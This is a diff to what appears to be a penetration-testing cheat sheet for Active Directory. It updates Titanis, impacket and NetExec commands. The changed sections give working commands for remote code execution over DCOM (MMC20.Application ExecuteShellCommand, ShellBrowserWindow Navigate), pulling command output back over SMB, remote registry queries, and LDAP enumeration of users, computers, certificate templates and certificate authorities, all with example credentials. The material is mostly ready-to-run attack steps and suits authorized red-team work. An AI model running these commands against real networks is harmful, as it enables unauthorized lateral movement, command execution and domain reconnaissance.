@@ -155,11 +155,7 @@ Wmi exec dc01 -ha 192.168.1.10 -Tgt /tmp/jdoe.ccache -Kdc 192.168.1.1 "hostname"
 
 > **Titanis `Dcom invoke` — CLSID lookup SOP:**
 > - **ProgID resolution is local.** Titanis resolves ProgIDs (e.g., `MMC20.Application`) from the attacker's registry, not the target's. From Linux there is no registry to resolve against; from Windows the attacker's CLSID may differ from the target's. Always use `Reg` to look up the actual CLSID on the remote system, then pass the raw GUID.
-> - **Single-hop IDispatch only.** Titanis calls `IDispatch::GetIDsOfNames` on the root activation object and does not traverse dotted property chains. The three commonly documented exec CLSIDs all bury their exec method behind multi-hop access and will return `DISP_E_MEMBERNOTFOUND` (0x80020003):
->   - `MMC20.Application` → `Document.ActiveView.ExecuteShellCommand`
->   - `ShellBrowserWindow` → `Document.Application.ShellExecute`
->   - `ShellWindows` → `Item.Document.Application.ShellExecute`
-> - A CLSID whose exec method is directly on the root IDispatch object will work. Finding one requires enumeration on the target.
+> - **Property chain traversal** (v0.9.20260320+): Dcom invoke now supports dotted property paths like `Document.ActiveView.ExecuteShellCommand`, traversing the IDispatch chain automatically. MMC20.Application works. ShellWindows `Item()` does not — it requires an index argument the chain syntax can't pass.
 
 ```bash
 # impacket
@@ -175,20 +171,31 @@ dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellBrowserWi
 # NetExec
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomexec
 
-# Titanis — Step 1: look up CLSID on the remote system
-# Titanis Reg list cannot read unnamed (default) registry values — use wmiexec for this step
+# Titanis — MMC20.Application ExecuteShellCommand (requires v0.9.20260320+)
+# 4 args: Command, Directory, Parameters, WindowState (7=minimized)
+# ExecuteShellCommand does not return output — redirect to a file and retrieve via Smb2Client
+Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+  49B2791A-B1AE-4C90-9B8E-E860BA07F889 \
+  Document.ActiveView.ExecuteShellCommand \
+  cmd.exe 'C:\' '/c whoami > C:\Windows\Temp\out.txt' '7'
+
+Smb2Client get -UserName jdoe@DOMAIN -Password Password123 \
+  '\\192.168.1.10\C$\Windows\Temp\out.txt'
+
+# Titanis — ShellBrowserWindow Navigate (launches exe, no args — works on older versions too)
+Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+  '{C08AFD90-F2A1-11D1-8455-00A0C91F3880}' Navigate \
+  'C:\Windows\System32\cmd.exe'
+
+# CLSID lookup SOP — look up on the remote system, then pass the raw GUID
+# Step 1: Titanis Reg list cannot read unnamed (default) registry values — use wmiexec
 wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 \
   'reg query HKCR\\MMC20.Application\\CLSID /ve'
 # → (Default)    REG_SZ    {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
 
-# Step 2 (optional): inspect the CLSID entry on the remote system to confirm AppID/auth level
+# Step 2 (optional): inspect the CLSID entry to confirm AppID/auth level
 Reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   'HKLM\SOFTWARE\Classes\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
-
-# Step 3: invoke with raw GUID
-# Note: exec method must be at the root IDispatch level — standard exec CLSIDs fail (multi-hop)
-Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
-  '{49B2791A-B1AE-4C90-9B8E-E860BA07F889}' MethodName arg1 arg2
 ```
 
 [↑ Back to Index](#index)
@@ -1862,6 +1869,12 @@ msldap "ldap+kerberos+ccache://DOMAIN\jdoe:@dc01.domain.local/?dc=192.168.1.1&cc
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=socks5&proxyhost=127.0.0.1&proxyport=1080"
 
 # Titanis — use Ldap query (not Ldap search) with -FollowReferrals on Linux
+# Linux notes:
+#   - Use Ldap query, not Ldap search — Ldap search always probes RootDSE first, hits a referral,
+#     and returns no records regardless of -SearchBase or -FollowReferrals
+#   - -FollowReferrals required — without it, referral targets are printed as INFO and results are empty
+#   - -OutputFields only accepts one field at a time on Linux; comma lists show header but no rows
+#     Workaround: -OutputFields '*' -OutputStyle List and grep/parse
 Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)" -FollowReferrals
 Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)" -FollowReferrals
 ```
@@ -2186,16 +2199,19 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> certtemplates
 
 # Titanis — enumerate certificate templates
-Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
-  "(objectClass=pKICertificateTemplate)" \
-  -OutputFields displayName,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,pKIExtendedKeyUsage
+# Note: Ldap search is broken on Linux (ignores -SearchBase, always queries RootDSE → no results)
+# Use ldapsearch below for Linux; Ldap search works on Windows
+# Windows only:
+# Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+#   -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
+#   "(objectClass=pKICertificateTemplate)" \
+#   -OutputFields displayName,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,pKIExtendedKeyUsage
 
-# Titanis — enumerate Enterprise CAs
-Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
-  "(objectClass=pKIEnrollmentService)" \
-  -OutputFields displayName,dNSHostName,certificateTemplates
+# Titanis — enumerate Enterprise CAs (Windows only — same Ldap search limitation on Linux)
+# Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+#   -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
+#   "(objectClass=pKIEnrollmentService)" \
+#   -OutputFields displayName,dNSHostName,certificateTemplates
 
 # ldapsearch
 ldapsearch -H ldap://192.168.1.1 -D "CN=jdoe,CN=Users,DC=domain,DC=local" -w Password123 \
